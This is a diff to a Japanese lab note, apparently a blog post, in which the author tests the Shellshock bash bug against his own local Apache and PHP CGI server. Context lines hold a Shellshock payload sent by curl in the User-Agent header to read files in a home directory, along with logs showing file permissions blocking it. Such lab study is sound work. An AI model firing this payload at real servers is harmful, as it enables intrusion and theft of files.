@@ -8,7 +8,7 @@ Copyright: (C) 2017 Ryuichi Ueda
 
 こういうファイルを準備。
 ```bash
-[root\@localhost httpd]# cat /var/www/html/index.php 
+[root@localhost httpd]# cat /var/www/html/index.php 
 #!/usr/bin/env php
 
 <?php
@@ -28,9 +28,9 @@ httpd.confのOptionsのところにExecCGIを追加し、
 
 ホームの下にファイルを準備
 ```bash
-[ueda\@localhost ~]$ ls -l mysecret 
+[ueda@localhost ~]$ ls -l mysecret 
 -rw-rw-r--. 1 ueda ueda 13 10月 3 20:07 2014 mysecret
-[ueda\@localhost ~]$ cat mysecret 
+[ueda@localhost ~]$ cat mysecret 
 私の秘密
 ```
 
@@ -41,7 +41,7 @@ uedambp:~ ueda$ curl -A '() { :; }; /bin/cat /home/ueda/*' http://localhost:8888
 
 ログを確認。パーミッションで守られている。
 ```bash
-[root\@localhost httpd]# tail error_log 
+[root@localhost httpd]# tail error_log 
 ...
 [Fri Oct 03 20:19:15 2014] [error] [client 10.0.2.2] /bin/cat: 
 [Fri Oct 03 20:19:15 2014] [error] [client 10.0.2.2] /home/ueda/*
@@ -61,7 +61,7 @@ apache:x:48:48:Apache:/var/www:/sbin/nologin
 
 今度はhttpd.confから追記部分をもう一度削り、index.phpを次のように書き換える。
 ```bash
-[root\@localhost httpd]# cat /var/www/html/index.php 
+[root@localhost httpd]# cat /var/www/html/index.php 
 <?php
 	system('date');
 ?>
@@ -76,7 +76,7 @@ Fri Oct 3 20:27:38 JST 2014
 
 もう一度CGIモードで。こんなコード。
 ```bash
-[root\@localhost httpd]# cat /var/www/html/index.php 
+[root@localhost httpd]# cat /var/www/html/index.php 
 #!/usr/bin/php
 
 <?php
@@ -93,7 +93,7 @@ hoge
 
 これは・・・
 ```bash
-[root\@localhost httpd]# cat /var/www/html/index.php 
+[root@localhost httpd]# cat /var/www/html/index.php 
 #!/usr/bin/php
 
 <?php
